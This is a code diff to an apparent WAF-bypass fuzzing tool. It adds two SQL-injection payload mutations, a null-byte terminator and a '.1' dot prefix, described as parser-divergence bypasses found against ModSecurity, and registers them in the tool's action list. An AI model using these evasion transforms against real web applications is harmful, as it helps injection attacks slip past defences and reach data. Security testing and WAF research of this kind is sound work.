@@ -515,6 +515,24 @@ class MutationEngine:
             return payload
         return payload.replace("/**/", "%252f%252a*/")
 
+    @staticmethod
+    def null_byte(payload: str) -> str:
+        """Append null-byte terminator: ...;%00
+        Truncates downstream parsing in some WAF/parser pairs."""
+        if "%00" in payload.lower():
+            return payload
+        # Strip trailing comment if present, then append ;%00
+        stripped = re.sub(r'(--\s*-?|--\+|#)\s*$', '', payload).rstrip()
+        return stripped + ";%00"
+
+    @staticmethod
+    def dot_prefix(payload: str) -> str:
+        """Prepend scientific-notation-like dot prefix: .1 + payload.
+        Exploits MySQL/libinjection parser divergence (SSQLi Fig.9 style)."""
+        if payload.startswith("."):
+            return payload
+        return ".1" + payload
+
 
 # Build action registry
 MUTATIONS = {
@@ -571,6 +589,9 @@ MUTATIONS = {
     "gbk_bypass":        MutationEngine.gbk_bypass,
     "backtick":          MutationEngine.backtick_keyword,
     "dbl_url_comment":   MutationEngine.double_url_encode_comment,
+    # --- Parser-divergence (manual-bypass discoveries vs ModSec) ---
+    "null_byte":         MutationEngine.null_byte,
+    "dot_prefix":        MutationEngine.dot_prefix,
 }
 
 ACTION_LIST = list(MUTATIONS.keys())
